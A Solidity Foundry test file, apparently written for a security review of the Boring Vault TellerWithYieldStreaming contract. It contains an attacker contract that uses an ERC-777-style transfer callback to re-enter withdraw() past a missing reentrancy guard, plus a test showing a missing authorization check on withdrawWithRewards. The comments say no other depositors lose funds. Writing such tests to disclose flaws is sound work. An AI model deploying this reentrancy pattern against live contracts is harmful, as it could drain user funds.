// SPDX-License-Identifier: SEL-1.0
// Copyright © 2025 Veda Tech Labs
// Derived from Boring Vault Software © 2025 Veda Tech Labs (TEST ONLY – NO COMMERCIAL USE)
// Licensed under Software Evaluation License, Version 1.0
pragma solidity 0.8.21;

import {Test, console} from "@forge-std/Test.sol";
import {BoringVault} from "src/base/BoringVault.sol";
import {TellerWithYieldStreaming} from "src/base/Roles/TellerWithYieldStreaming.sol";
import {
    TellerWithMultiAssetSupport,
    DepositParams,
    ComplianceData,
    RewardData
} from "src/base/Roles/TellerWithMultiAssetSupport.sol";
import {AccountantWithYieldStreaming} from "src/base/Roles/AccountantWithYieldStreaming.sol";
import {IncentivePool} from "src/base/IncentivePool.sol";
import {RolesAuthority, Authority} from "@solmate/auth/authorities/RolesAuthority.sol";
import {ERC20} from "@solmate/tokens/ERC20.sol";
import {SafeTransferLib} from "@solmate/utils/SafeTransferLib.sol";
import {MessageHashUtils} from "@openzeppelin-contracts-5.3.0/utils/cryptography/MessageHashUtils.sol";

// ---------------------------------------------------------------------------
// Helper contracts
// ---------------------------------------------------------------------------

contract MockToken is ERC20 {
    constructor(string memory name_, string memory symbol_, uint8 decimals_) ERC20(name_, symbol_, decimals_) {}

    function mint(address to, uint256 amount) external {
        _mint(to, amount);
    }
}

/// @dev Simulates ERC-777 transfer callback: notifies recipient on every transfer.
contract ERC777LikeToken is ERC20 {
    constructor() ERC20("ERC777Like", "E777", 18) {}

    function mint(address to, uint256 amount) external {
        _mint(to, amount);
    }

    function transfer(address to, uint256 amount) public override returns (bool) {
        balanceOf[msg.sender] -= amount;
        unchecked {
            balanceOf[to] += amount;
        }
        emit Transfer(msg.sender, to, amount);

        if (to.code.length > 0) {
            try ITokenReceiver(to).onTokenReceived(msg.sender, amount) {} catch {}
        }
        return true;
    }
}

interface ITokenReceiver {
    function onTokenReceived(address from, uint256 amount) external;
}

/// @dev Attacker contract that re-enters teller.withdraw() when it receives
///      ERC-777-like reward tokens during _processRewards.
contract ReentrancyExploiter is ITokenReceiver {
    TellerWithYieldStreaming public immutable teller;
    ERC20 public immutable withdrawAsset;

    uint256 public reentrantShareAmount;
    uint256 public reentrantWithdrawCount;
    bool public armed;

    constructor(address _teller, address _withdrawAsset) {
        teller = TellerWithYieldStreaming(payable(_teller));
        withdrawAsset = ERC20(_withdrawAsset);
    }

    function attack(uint256 outerShares, uint256 innerShares, RewardData[] calldata rewards)
        external
        returns (uint256)
    {
        armed = true;
        reentrantShareAmount = innerShares;
        return teller.withdrawWithRewards(withdrawAsset, outerShares, 0, address(this), rewards);
    }

    /// @dev Called by ERC777LikeToken during safeTransfer inside IncentivePool.processRewards.
    ///      Re-enters teller.withdraw() — the nonReentrant guard is NOT set because
    ///      withdrawWithRewards never acquired it.
    function onTokenReceived(address, uint256) external override {
        if (armed) {
            armed = false;
            reentrantWithdrawCount++;
            teller.withdraw(withdrawAsset, reentrantShareAmount, 0, address(this));
        }
    }
}

// ---------------------------------------------------------------------------
// Test
// ---------------------------------------------------------------------------

// NOTE: These tests prove that the nonReentrant and requiresAuth modifiers are
// missing on TellerWithYieldStreaming.withdrawWithRewards, but they do NOT
// demonstrate concrete financial damage. The attacker only ever burns their own
// shares for their own fair share of assets -- no value is extracted from other
// depositors. The reentrancy test shows two withdrawals in one tx, but that is
// economically identical to two separate withdraw() calls.
//
// Why no real exploit materialises under the current contract state:
//   - IncentivePool updates _claimHistory BEFORE the token transfer, so
//     re-entering cannot double-claim rewards.
//   - updateExchangeRate() is called BEFORE shares are burned in _withdraw,
//     so reducing supply via a re-entered withdrawal does not inflate the rate.
//   - The exchange rate is time-based (yield vesting), not balance-based, so
//     withdrawals within the same block see the same rate.
//
// The tests exist to document that the reentrancy guard invariant IS broken
// (a defense-in-depth failure). Future changes to reward tokens, exchange-rate
// logic, or pool contracts could turn this into a real exploit.
contract TellerYieldStreamingReentrancyTest is Test {
    using SafeTransferLib for ERC20;

    uint8 constant ADMIN_ROLE = 1;
    uint8 constant MINTER_ROLE = 7;
    uint8 constant BURNER_ROLE = 8;
    uint8 constant TELLER_MANAGER_ROLE = 62;
    uint8 constant POOL_ROLE = 63;

    BoringVault vault;
    AccountantWithYieldStreaming accountant;
    TellerWithYieldStreaming teller;
    RolesAuthority rolesAuthority;

    MockToken baseAsset;
    ERC777LikeToken rewardToken;

    uint256 signerKey;
    address signer;

    function setUp() public {
        (signer, signerKey) = makeAddrAndKey("rewardSigner");

        baseAsset = new MockToken("USDC", "USDC", 6);
        rewardToken = new ERC777LikeToken();

        vault = new BoringVault(address(this), "Vault", "VLT", 6);

        accountant = new AccountantWithYieldStreaming(
            address(this), address(vault), makeAddr("payout"), 1e6, address(baseAsset), 1.1e4, 0.9e4, 1, 0, 0
        );

        teller = new TellerWithYieldStreaming(
            address(this), address(vault), address(accountant), address(new MockToken("WETH", "WETH", 18))
        );

        rolesAuthority = new RolesAuthority(address(this), Authority(address(0)));
        vault.setAuthority(rolesAuthority);
        accountant.setAuthority(rolesAuthority);
        teller.setAuthority(rolesAuthority);

        // Vault: teller can mint/burn
        rolesAuthority.setRoleCapability(MINTER_ROLE, address(vault), BoringVault.enter.selector, true);
        rolesAuthority.setRoleCapability(BURNER_ROLE, address(vault), BoringVault.exit.selector, true);
        rolesAuthority.setUserRole(address(teller), MINTER_ROLE, true);
        rolesAuthority.setUserRole(address(teller), BURNER_ROLE, true);

        // Accountant: teller can update rate + set first deposit
        rolesAuthority.setRoleCapability(
            MINTER_ROLE, address(accountant), AccountantWithYieldStreaming.setFirstDepositTimestamp.selector, true
        );
        rolesAuthority.setRoleCapability(
            TELLER_MANAGER_ROLE, address(accountant), bytes4(keccak256("updateExchangeRate()")), true
        );
        rolesAuthority.setRoleCapability(
            TELLER_MANAGER_ROLE, address(accountant), bytes4(keccak256("updateCumulative()")), true
        );
        rolesAuthority.setUserRole(address(teller), TELLER_MANAGER_ROLE, true);

        // Teller admin
        rolesAuthority.setRoleCapability(
            ADMIN_ROLE, address(teller), TellerWithMultiAssetSupport.updateAssetData.selector, true
        );
        rolesAuthority.setUserRole(address(this), ADMIN_ROLE, true);

        // Public capabilities — withdraw and withdrawWithRewards open to all users
        rolesAuthority.setPublicCapability(address(teller), TellerWithMultiAssetSupport.deposit.selector, true);
        rolesAuthority.setPublicCapability(address(teller), TellerWithMultiAssetSupport.withdraw.selector, true);
        rolesAuthority.setPublicCapability(
            address(teller), TellerWithMultiAssetSupport.withdrawWithRewards.selector, true
        );
        // NOTE: claimRewards is intentionally NOT public

        // Asset config
        teller.updateAssetData(ERC20(address(baseAsset)), true, true, 0);
        accountant.setRateProviderData(ERC20(address(baseAsset)), true, address(0));
    }

    // -- helpers --

    function _signReward(address pool_, address recipient, uint256 cumulative, uint256 deadline)
        internal
        view
        returns (bytes memory)
    {
        bytes32 hash = keccak256(abi.encode(pool_, block.chainid, recipient, cumulative, deadline));
        bytes32 ethHash = MessageHashUtils.toEthSignedMessageHash(hash);
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(signerKey, ethHash);
        return abi.encodePacked(r, s, v);
    }

    function _deposit(address user, uint256 amount) internal returns (uint256) {
        baseAsset.mint(user, amount);
        vm.startPrank(user);
        ERC20(address(baseAsset)).safeApprove(address(vault), amount);
        uint256 shares =
            teller.deposit(DepositParams(ERC20(address(baseAsset)), amount, 0), address(0), ComplianceData(0, ""));
        vm.stopPrank();
        return shares;
    }

    function _setupPool(uint256 fundAmount) internal returns (IncentivePool) {
        IncentivePool pool = new IncentivePool(address(this), ERC20(address(rewardToken)));
        pool.setAuthority(rolesAuthority);
        rolesAuthority.setRoleCapability(POOL_ROLE, address(pool), IncentivePool.processRewards.selector, true);
        rolesAuthority.setUserRole(address(teller), POOL_ROLE, true);

        pool.setRewardSigner(signer);
        pool.setMaximumRewardAmountPerClaim(uint96(fundAmount));
        pool.setMaxDeadline(1 days);
        pool.setTotalRewardCap(uint104(fundAmount));

        rewardToken.mint(address(pool), fundAmount);
        return pool;
    }

    // -- tests --

    /// @notice Proves the nonReentrant guard on withdraw() is bypassed because
    ///         withdrawWithRewards never acquires the reentrancy lock.
    ///
    ///         Attack flow:
    ///         1. Attacker calls withdrawWithRewards (no nonReentrant)
    ///         2. _processRewards -> IncentivePool -> ERC-777 safeTransfer -> callback
    ///         3. Callback re-enters teller.withdraw() — lock is still 1, so it passes
    ///         4. Re-entered withdraw burns shares and sends assets
    ///         5. Callback returns, original withdrawWithRewards calls withdraw() again
    ///         6. Lock was reset to 1 after step 4, so it passes a second time
    ///         Result: TWO full withdrawals from a single withdrawWithRewards call.
    ///
    ///         In the base TellerWithMultiAssetSupport, withdrawWithRewards has
    ///         nonReentrant — the callback in step 3 would hit locked==2 and revert.
    function testReentrancy_NonReentrantBypassed() public {
        uint256 rewardAmount = 100e18;
        IncentivePool pool = _setupPool(rewardAmount);

        ReentrancyExploiter attacker = new ReentrancyExploiter(address(teller), address(baseAsset));

        // Give attacker enough shares for two withdrawals
        uint256 depositAmount = 200e6;
        _deposit(address(attacker), depositAmount);
        uint256 totalShares = vault.balanceOf(address(attacker));
        uint256 halfShares = totalShares / 2;

        uint256 vaultBefore = baseAsset.balanceOf(address(vault));

        // Build reward data
        uint256 deadline = block.timestamp + 1 hours;
        bytes memory sig = _signReward(address(pool), address(attacker), rewardAmount, deadline);
        RewardData[] memory rewards = new RewardData[](1);
        rewards[0] = RewardData(address(pool), rewardAmount, deadline, sig);

        // Single call triggers TWO withdraw() executions
        attacker.attack(halfShares, halfShares, rewards);

        // -- assertions --
        assertEq(attacker.reentrantWithdrawCount(), 1, "re-entrant withdraw executed in callback");

        uint256 remainingShares = vault.balanceOf(address(attacker));
        assertEq(remainingShares, totalShares - 2 * halfShares, "both batches of shares burned");

        uint256 vaultAfter = baseAsset.balanceOf(address(vault));
        uint256 attackerAssets = baseAsset.balanceOf(address(attacker));

        assertGt(attackerAssets, 0, "attacker received assets");
        assertEq(vaultBefore - vaultAfter, attackerAssets, "vault drained by both withdrawals");
        assertEq(rewardToken.balanceOf(address(attacker)), rewardAmount, "rewards also claimed");

        console.log("--- REENTRANCY GUARD BYPASS ---");
        console.log("withdrawWithRewards called once -> withdraw() executed TWICE");
        console.log("  Shares burned:      ", 2 * halfShares);
        console.log("  Assets extracted:   ", attackerAssets);
        console.log("  Rewards claimed:    ", rewardAmount / 1e18);
        console.log("  nonReentrant:        BYPASSED");
    }

    /// @notice Shows that claimRewards (which has requiresAuth + nonReentrant)
    ///         correctly blocks an unauthorized caller, while the same user CAN
    ///         trigger _processRewards via withdrawWithRewards because the override
    ///         dropped requiresAuth.
    ///
    ///         Impact is limited because the inner withdraw() call checks auth via
    ///         msg.sig, which propagates the original withdrawWithRewards selector.
    ///         If withdrawWithRewards is NOT a public capability, the tx still reverts.
    ///         But if it IS public (as in this test), the auth modifier is redundant
    ///         and the real damage vector is reentrancy (see test above).
    function testAuthBypass_ClaimRewardsBlockedButWithdrawWithRewardsOpen() public {
        uint256 rewardAmount = 50e18;
        IncentivePool pool = _setupPool(rewardAmount);

        address user = makeAddr("regularUser");
        _deposit(user, 10e6);

        uint256 deadline = block.timestamp + 1 hours;
        bytes memory sig = _signReward(address(pool), user, rewardAmount, deadline);
        RewardData[] memory rewards = new RewardData[](1);
        rewards[0] = RewardData(address(pool), rewardAmount, deadline, sig);

        // claimRewards requires auth — user has no role, so this reverts
        vm.prank(user);
        vm.expectRevert("UNAUTHORIZED");
        teller.claimRewards(rewards);

        // But withdrawWithRewards succeeds (dropped requiresAuth + withdraw is public)
        uint256 shares = vault.balanceOf(user);
        vm.prank(user);
        teller.withdrawWithRewards(ERC20(address(baseAsset)), shares, 0, user, rewards);

        assertEq(rewardToken.balanceOf(user), rewardAmount, "rewards claimed via withdrawWithRewards");
        assertEq(vault.balanceOf(user), 0, "shares withdrawn");

        console.log("--- AUTH ASYMMETRY ---");
        console.log("claimRewards:          UNAUTHORIZED (correct)");
        console.log("withdrawWithRewards:   succeeded (missing requiresAuth)");
        console.log("Rewards claimed:      ", rewardAmount / 1e18);
    }
}
